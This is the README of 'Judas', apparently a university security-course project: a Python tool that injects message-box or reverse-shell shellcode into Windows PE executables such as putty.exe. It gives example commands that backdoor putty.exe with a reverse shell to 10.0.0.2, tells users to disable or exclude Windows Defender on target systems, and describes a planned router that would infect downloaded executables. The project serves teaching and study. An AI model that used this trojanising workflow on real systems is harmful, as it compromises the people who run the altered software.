# Judas

## Background

This is an attack project for COMP 6970: Computer Security at the Fringes.
It's purpose and intent is purely for educational purposes.

The goal was to build a framework that could inject malicious code into PE files on the fly.
An additional step was to hook an open source router firmware so that when an executable is being downloaded to a client's computer the router would automatically inject the malicious code and hand off the new file to the client.

Unfortunately, we were unable to have the router firmware modification working by the due date.

## Setup

First ensure your box is completely up to date.
The instructions that follow assume you are using a Debian based Linux distribution.
The only system that is known not to work with this framework is macOS as for some reason it does not ship with memory map.

```bash
sudo apt update && sudo apt upgrade -y
```

After updating and upgrading the system install the dependencies needed by Judas.
I would recommend installing keystone by building the source. I had issues using Python's Pip.

```bash
pushd
NB_CPU="$(grep -c processor /proc/cpuinfo)"
sudo apt-get install python3-pip git cmake gcc g++ pkg-config libglib2.0-dev libssl-dev -y
cd /tmp
git clone https://github.com/keystone-engine/keystone.git
cd keystone
mkdir build
cd build
sed -i "s/make -j8/make -j${NB_CPU}/g" ../make-share.sh
../make-share.sh
sudo make install
sudo ldconfig
cd ../bindings/python
sudo make install3
popd
```

```bash
pip3 install -r requirements.txt
```

## Execution

To run the tool we recommend running `backdoor.py` as it is treated as the driver for Judas.
Our tool utilizes Python's argparse module to help with command line arguments.
In its current state it can take in a multitiude of different arguments.

## Example

To inject the message box shellcode into putty.exe run the following code:

`python3 ./src/backdoor ./assets/bin/putty.exe -t msg`

To inject the reverse shell shellcode with listening host of 10.0.0.2 and listening port of 80 into putty.exe run the following code:

`python3 ./src/backdoor ./assets/bin/putty.exe -t rev -lH 10.0.0.2 -lP 80`

To run Judas on putty.exe in wizard mode run the following code:

`python3 ./src/backdoor ./assets/bin/putty.exe -w`

## Option Summary

### Path

The only required parameter is path which is expected to come immediately after the call to backdoor.
This is the path to the file that you wish to inject.

### Listening Port (-lP | --lport)

Port the shellscript will listen on, not applicable to all shell scripts.
For example the message box script does not take a listening port.

### Listening Host (-lH | --lhost)

Host's IP the shellscript will listen on, not applicable to all shell scripts.
For example the message box script does not take a listening host.

### Section Size (-sS | --section_size)

Size of the section being injected into the binary.
Defaults to 1024.

### Page Size (-pS | --page_size)

Size of the page being injected into the binary.
Defaults to 1024.

### Section Permissions (-sP | --section_permissions)

Permissions of the section being injected into the binary.
Defaults to 0xE0000000 (READ | EXECUTE).

### Section Name (-sN | --section_name)

Name of the section being injected into the binary.
Defaults to .pwn.

### Payload Type (-t | --type)

Type of the payload being injected.
Current options:
    msg : message box shell script
    rev : reverse shell script

### Wizard Mode (-w | --wizard)

Activates wizard which prompts users for inputs depending on type of payload chosen.

### Verbose Mode (-v | --verbose)

Activates verbose mode

## Windows

If running this script on Windows ensure you exclude this folder from Windows Defender scans.
If you do not Windows Defender will automatically delete the file produced by the script.
Go to `Windows Defender Security Center`, then `Virus & threat protection settings`, and at the bottom there is `Exclusions`.
Add a new folder and put in the path for this repo.
The same goes for when you exploit the Windows system.
In this projects current state it cannot bypass antivirus, so to see it actually work ensure AV is disabled or marked to exclude the directory Judas is executed from.

## Resources

* https://captmeelo.com/exploitdev/osceprep/2018/07/16/backdoor101-part1.html
* https://resources.infosecinstitute.com/back-dooring-pe-files-windows/
* https://r0ttenbeef.github.io/backdooring-pe-file/
* https://axcheron.github.io/code-injection-with-python/
* https://docs.microsoft.com/en-us/windows/win32/debug/pe-format?redirectedfrom=MSDN
* https://resources.infosecinstitute.com/2-malware-researchers-handbook-demystifying-pe-file/

## Dependencies

* Assembler
  * https://github.com/keystone-engine/keystone
* PE Parser
  * https://github.com/erocarrera/pefile
* Network Interface
  * https://github.com/al45tair/netifaces
